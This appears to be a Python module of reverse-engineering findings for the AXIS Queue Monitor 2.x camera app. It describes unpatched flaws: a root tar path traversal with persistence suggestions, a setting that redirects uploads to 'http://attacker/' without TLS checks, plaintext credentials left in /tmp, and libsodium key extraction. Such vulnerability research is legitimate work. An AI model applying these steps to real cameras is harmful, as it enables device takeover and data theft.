"""
AXIS Queue Monitor 2.x (tvqu C binary) — RE findings
CONTROLLED ENVIRONMENT ONLY

Affected: AXIS Queue Monitor 2.x (tvqu), appId 211492
Version: 2.10.67  Arch: armv7hf stripped
APPUSR=root APPGRP=root (maximum blast radius — C binary, 2.x branch)

NOTE: 3.x is a Rust rewrite (sdk user, not root) — see axis_queue_monitor_v3.py.
2.x C binary runs as root. Same codebase family as tvgd/tvpc (shared backup/restore pattern).
Bundled: curl (not stripped), libmd5.so, libcjson.so.1, libsodium.so.23.
"""

# CONTROLLED ENVIRONMENT ONLY

FINDING = "AXIS-QM"
LABEL = "tvqu 2.x root: tarslip as root, WebReportUpload SSRF, param dump, libsodium key"

FINDINGS = [
    {
        "id": "AXIS-QM-01",
        "severity": "HIGH",
        "title": "Tarslip via .restore_backup operator CGI as root",
        "detail": (
            "APPUSR=root. "
            "'Untaring temp-restore-params-file.tar.gz to /tmp/backup'. "
            "tar xzf /tmp/temp-restore-params-file.tar.gz -C /tmp/backup — no path traversal check. "
            "Operator uploads malicious tar.gz with ../../ entries: "
            "arbitrary file write as root -> persistent rootkit, replace /etc/init.d/ entries."
        ),
        "cgi": "/.restore_backup (operator)",
        "prerequisite": "Operator-level camera auth",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-QM-02",
        "severity": "HIGH",
        "title": "WebReportUpload TLS bypass + SSRF",
        "detail": (
            "Set WebReportUpload0AllowInsecure=1 + WebReportUpload0Url=http://attacker/. "
            "tvqu sends encrypted queue counts to attacker at configured ReportInterval. "
            "TLS not verified when AllowInsecure=1. "
            "SSRF: camera makes outbound HTTP connection to attacker-controlled URL. "
            "Proxy support via WebReportUpload0Proxy adds additional hop to chain."
        ),
        "params": {
            "WebReportUpload0Url": "(operator-writable)",
            "WebReportUpload0AllowInsecure": "0 (set to 1 for TLS bypass)",
            "WebReportUpload0User": "(operator-writable)",
        },
        "prerequisite": "Operator-level axparam write",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-QM-03",
        "severity": "MEDIUM",
        "title": "parhandclient param dump — credentials to /tmp/parambackup.txt",
        "detail": (
            "parhandclient getgroup root.tvqu with filter excluding only: "
            "Counter0Name, Counter0OccName, Environment0, Build0. "
            "WebReportUpload0User and WebReportUpload0ProxyUser written in plaintext "
            "to /tmp/parambackup.txt. "
            "Readable by any local process with /tmp access (post-RCE or via tarslip QM-01)."
        ),
        "filter_exclusions": ["Counter0Name", "Counter0OccName", "Environment0", "Build0"],
        "output_file": "/tmp/parambackup.txt",
        "prerequisite": "Read access to /tmp/ (local process or via tarslip)",
        "status": "UNPATCHED",
        "cve": None,
    },
    {
        "id": "AXIS-QM-04",
        "severity": "MEDIUM",
        "title": "libsodium NaCl key extraction -> queue data decryption",
        "detail": (
            "crypto_box_easy_afternm, crypto_secretbox, crypto_scalarmult_base in binary. "
            "Queue count data encrypted before cloud upload via NaCl box. "
            "Key derivation unknown (static vs device-specific). "
            "If key is static or derived from known device material (serial/MAC): "
            "offline decryption of captured queue uploads -> full queue analytics data."
        ),
        "crypto": ["crypto_box_easy_afternm", "crypto_secretbox", "crypto_scalarmult_base"],
        "prerequisite": "Capture of queue upload data + key derivation reverse engineering",
        "status": "UNPATCHED",
        "cve": None,
    },
]
